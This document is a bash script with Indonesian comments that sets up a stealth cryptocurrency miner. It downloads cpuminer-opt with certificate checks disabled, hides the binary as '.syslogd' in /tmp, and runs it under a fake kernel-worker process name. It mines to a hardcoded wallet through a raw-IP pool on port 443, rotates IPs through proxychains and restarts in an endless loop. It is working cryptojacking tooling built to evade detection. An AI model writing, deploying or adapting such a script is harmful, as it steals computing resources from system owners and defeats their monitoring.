#!/bin/bash
set -e

# ====[ Konfigurasi User ]====
WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9.Danis"
POOL="stratum+tcps://159.223.48.143:443"
ALGO="power2b"
THREADS=$(( $(nproc --all) / 2 ))
BIN_NAME=".syslogd"
PROCESS_NAME="[kworker/u8:3-events]"
LOG_FILE=".xlog"

# ====[ Durasi maksimal: 50 menit (3000 detik) ]====
MAX_RUNTIME=3000

# ====[ Rotasi IP via proxy (jika menggunakan proxychains) ]====
rotate_ip() {
    if command -v proxychains4 >/dev/null 2>&1; then
        echo "[INFO] Mengaktifkan rotasi IP via proxychains..."
        export LD_PRELOAD=/usr/lib/libproxychains.so.4
    else
        echo "[INFO] Tidak ada proxychains, lanjut tanpa rotasi IP."
    fi
}

# ====[ Unduh miner jika belum ada ]====
if [ ! -f "$BIN_NAME" ]; then
    echo "[INFO] Mengunduh miner..."
    wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 "$BIN_NAME"
    chmod +x "$BIN_NAME"
    rm -f cpuminer-opt-linux.tar.gz
fi

# ====[ Fungsi menjalankan miner ]====
run_miner() {
    echo "[INFO] Menjalankan miner stealth dengan $THREADS threads selama $((MAX_RUNTIME/60)) menit..."
    cp "$BIN_NAME" "/tmp/$BIN_NAME.$$"
    chmod +x "/tmp/$BIN_NAME.$$"
    rm -f "$BIN_NAME"

    # Jalankan dengan limit waktu
    timeout $MAX_RUNTIME bash -c "
        exec -a '$PROCESS_NAME' /tmp/$BIN_NAME.$$ -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS
    " >> "$LOG_FILE" 2>&1
}

# ====[ Loop restart miner per jam + rotasi IP ]====
while true; do
    rotate_ip
    echo "[INFO] $(date) :: Memulai sesi mining baru..." >> "$LOG_FILE"
    run_miner
    echo "[INFO] $(date) :: Sesi selesai. Restart..." >> "$LOG_FILE"
    sleep 5
done
